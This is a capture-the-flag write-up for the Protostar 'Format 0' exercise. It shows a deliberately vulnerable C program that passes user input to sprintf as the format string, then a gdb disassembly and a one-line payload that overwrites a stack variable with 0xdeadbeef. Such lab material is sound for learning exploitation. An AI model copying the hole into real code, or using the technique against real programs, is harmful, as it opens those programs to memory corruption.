# PROTOSTAR : FORMAT 0
[Protostar:Format0](https://exploit.education/protostar/format-zero/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Format Strings 

The above code is vulnerable to format strings vulnerability.
The **sprintf** is vulnerable to format strings because it is not checking the format specifier of the input. Format Strings can cause memory leak or memory write.

### **SOLUTION**

Below is the disassembly of the **vuln()** function.
```
user@protostar:/opt/protostar/bin$ gdb -q format0
Reading symbols from /opt/protostar/bin/format0...done.
(gdb) set disassembly-flavor intel
(gdb) disass vuln
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x68
0x080483fa <vuln+6>:    mov    DWORD PTR [ebp-0xc],0x0
0x08048401 <vuln+13>:   mov    eax,DWORD PTR [ebp+0x8]
0x08048404 <vuln+16>:   mov    DWORD PTR [esp+0x4],eax
0x08048408 <vuln+20>:   lea    eax,[ebp-0x4c]
0x0804840b <vuln+23>:   mov    DWORD PTR [esp],eax
0x0804840e <vuln+26>:   call   0x8048300 <sprintf@plt>
0x08048413 <vuln+31>:   mov    eax,DWORD PTR [ebp-0xc]
0x08048416 <vuln+34>:   cmp    eax,0xdeadbeef
0x0804841b <vuln+39>:   jne    0x8048429 <vuln+53>
0x0804841d <vuln+41>:   mov    DWORD PTR [esp],0x8048510
0x08048424 <vuln+48>:   call   0x8048330 <puts@plt>
0x08048429 <vuln+53>:   leave  
0x0804842a <vuln+54>:   ret    
End of assembler dump.
```

The input has to be less than 10 bytes and the string **deadbeef** already takes 4 bytes. So lets write a python script to solve this challenge.

```
user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print '%64d' + '\xef\xbe\xad\xde'")
you have hit the target correctly :)
```

Since there are no format arguments but format specifier **%64d** is provided so it will execute 64 spaces to fill the **buffer** variable then append the **deadbeef** string.